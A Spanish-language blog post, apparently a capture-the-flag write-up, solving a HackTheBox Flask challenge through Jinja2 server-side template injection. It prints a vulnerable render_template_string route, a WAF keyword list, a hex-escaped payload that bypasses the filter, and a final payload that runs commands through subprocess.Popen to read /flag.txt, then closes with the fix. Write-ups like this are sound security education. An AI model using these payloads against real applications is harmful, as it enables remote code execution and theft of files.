---
layout: post
title: "CTF Writeup: SSTI en Jinja2 con bypass de sandbox"
date: 2024-10-25
tags: [ctf, web, ssti]
reading_time: 5
excerpt: "Solución del reto Flask de HackTheBox donde el WAF bloqueaba los vectores habituales. Bypass completo usando atributos de clase en cadena."
---

Reto de web de HackTheBox. La app renderiza input del usuario directamente en una plantilla Jinja2 sin sanitizar.

## Reconocimiento

El endpoint vulnerable acepta un parámetro `name` que se inyecta en la plantilla:

```python
@app.route('/')
def index():
    name = request.args.get('name', 'guest')
    return render_template_string(f"Hello {name}!")
```

Verificamos SSTI con el payload clásico:

```
/?name={{7*7}}
# Respuesta: Hello 49!
```

## El problema: WAF activo

Intentar `{{config}}` o `{{self.__dict__}}` devuelve 403. El WAF bloquea palabras clave como `__class__`, `__mro__`, `__subclasses__`, `config`, `request`.

## Bypass con atributos en cadena

Jinja2 permite acceder a atributos con la notación de corchetes y strings, lo que podemos construir dinámicamente para evadir el WAF:

```
{{ ''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']() }}
```

Donde `\x5f` es el byte de `_` en hex. El WAF inspecciona el texto en claro pero no decodifica los escapes de Jinja2.

## RCE final

Localizamos la clase `subprocess.Popen` en el listado de subclases (índice varía según el entorno) y ejecutamos:

```python
# Buscar el índice de Popen
for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
    if 'Popen' in str(cls):
        print(i)
```

Payload final para leer la flag:

```
{{ ''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[INDEX](['cat','/flag.txt'],stdout=-1).communicate()[0] }}
```

## Lección

Los WAFs que filtran strings en claro son inútiles contra encodings a nivel de template. La solución correcta es no renderizar input del usuario con `render_template_string` — usar `render_template` con variables separadas.
